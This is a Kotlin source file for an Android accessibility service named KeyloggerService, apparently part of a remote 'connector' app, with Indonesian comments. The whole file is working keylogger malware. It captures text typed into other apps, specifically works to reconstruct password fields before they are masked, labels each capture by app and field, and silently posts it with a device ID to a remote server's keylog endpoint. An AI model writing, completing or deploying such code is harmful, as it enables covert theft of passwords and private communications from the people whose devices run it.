package com.kztutorial99.androidconnector

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import com.google.gson.JsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class KeyloggerService : AccessibilityService() {

    private val http = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()
    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    private var lastText    = ""
    private var lastPackage = ""
    private var lastField   = ""

    // Buffer per-field untuk reconstruct teks password
    private val fieldBuffer = mutableMapOf<String, StringBuilder>()

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_FOCUSED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val ev = event ?: return
        if (ev.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return

        val packageName = ev.packageName?.toString() ?: return
        if (packageName == this.packageName) return

        val src = ev.source

        // Cek apakah field ini adalah password field
        val isPasswordField = src?.isPassword == true

        val text: String = if (isPasswordField) {
            // Field password — reconstruct dari beforeText + addedCount
            // JANGAN pakai ev.text karena sudah di-mask
            val fieldKey = "${packageName}_${src?.viewIdResourceName ?: "field"}"
            val buf = fieldBuffer.getOrPut(fieldKey) { StringBuilder() }

            val addedCount   = ev.addedCount
            val removedCount = ev.removedCount

            if (removedCount > 0 && addedCount == 0) {
                // Hapus karakter dari belakang
                val newLen = (buf.length - removedCount).coerceAtLeast(0)
                if (buf.length > newLen) buf.delete(newLen, buf.length)
            } else if (addedCount > 0) {
                // Coba ambil teks asli dari node (sebelum masking)
                val nodeText = src?.text?.toString() ?: ""
                if (nodeText.isNotBlank() && !nodeText.all { it == '•' || it == '*' || it == '·' }) {
                    // Node text belum di-mask, ambil langsung
                    buf.clear()
                    buf.append(nodeText)
                } else {
                    // Sudah di-mask — gunakan beforeText untuk tahu panjang sebelumnya
                    // addedCount = jumlah karakter yang ditambah, tapi kita tidak tahu karakternya
                    // Kita tandai dengan placeholder agar user tahu ada karakter tapi tidak terdeteksi
                    repeat(addedCount) { buf.append('?') }
                }
            }
            buf.toString()
        } else {
            // Field biasa — ambil teks langsung, ini pasti tidak ter-mask
            val rawText = src?.text?.toString()?.trim()
                ?: ev.text.joinToString("").trim()

            // Pastikan bukan teks masked
            if (rawText.all { it == '•' || it == '*' || it == '·' }) {
                src?.recycle()
                return
            }
            rawText
        }

        src?.recycle()
        if (text.isBlank()) return

        val fieldHint = event.source?.let { node ->
            val hint   = node.hintText?.toString() ?: ""
            val desc   = node.contentDescription?.toString() ?: ""
            val viewId = node.viewIdResourceName?.substringAfterLast("/") ?: ""
            val result = when {
                hint.isNotBlank()   -> hint
                desc.isNotBlank()   -> desc
                viewId.isNotBlank() -> viewId
                else -> ev.className?.toString()?.substringAfterLast(".") ?: "Field"
            }
            node.recycle()
            result
        } ?: "Field"

        // Debounce
        if (text == lastText && packageName == lastPackage && fieldHint == lastField) return
        lastText    = text
        lastPackage = packageName
        lastField   = fieldHint

        val prefs    = getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", null) ?: return

        val body = JsonObject().apply {
            addProperty("deviceId",   deviceId)
            addProperty("appPackage", packageName)
            addProperty("appName",    getAppName(packageName))
            addProperty("fieldName",  fieldHint)
            addProperty("text",       text)
        }

        Thread {
            try {
                http.newCall(
                    Request.Builder()
                        .url("${SecureConfig.serverUrl()}/api/device/keylog")
                        .post(body.toString().toRequestBody(JSON_MEDIA))
                        .build()
                ).execute().close()
            } catch (_: Exception) {}
        }.also { it.isDaemon = true }.start()
    }

    override fun onInterrupt() {}

    private fun getAppName(pkg: String): String {
        return try {
            packageManager.getApplicationLabel(packageManager.getApplicationInfo(pkg, 0)).toString()
        } catch (_: Exception) { pkg }
    }
}
